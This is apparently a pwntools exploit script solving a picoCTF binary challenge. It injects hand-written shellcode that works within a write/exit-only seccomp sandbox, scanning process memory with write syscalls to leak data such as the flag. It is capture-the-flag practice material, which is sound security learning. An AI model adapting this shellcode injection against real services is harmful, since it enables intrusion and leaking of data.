#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mars.picoctf.net", 31021)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+186
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


"""
Allowed Syscall List
* write
* exit
* exit_group
"""

payload = asm("""
            mov r10, 0x555572800000
            add r10, 0x202060

            add r10, 1048576
            mov rax, 1
            mov rdi, 1
            mov rsi, r10
            mov rdx, 100
            syscall
            cmp rax, 0
            jle $-0x25

            mov rax, 60
            mov rdi, 0
            syscall
        """)

p.sendlineafter('!', payload)

p.interactive()
